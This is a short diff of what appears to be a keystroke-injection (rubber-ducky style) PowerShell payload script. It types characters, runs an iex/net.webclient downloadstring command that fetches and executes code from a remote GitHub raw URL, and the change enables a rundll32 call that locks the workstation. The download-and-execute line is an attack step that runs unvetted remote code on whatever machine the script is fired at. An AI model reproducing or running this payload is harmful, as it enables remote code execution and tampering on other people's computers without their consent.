@@ -28,5 +28,5 @@ k "~Thank you."
 k "% "
 sleep -milliseconds 100
 k "x"
-#rundll32.exe user32.dll, LockWorkStation
 iex (new-object net.webclient).downloadstring("http://raw.githubusercontent.com/computer-geek64/ducky/master/d")
+rundll32.exe user32.dll, LockWorkStation
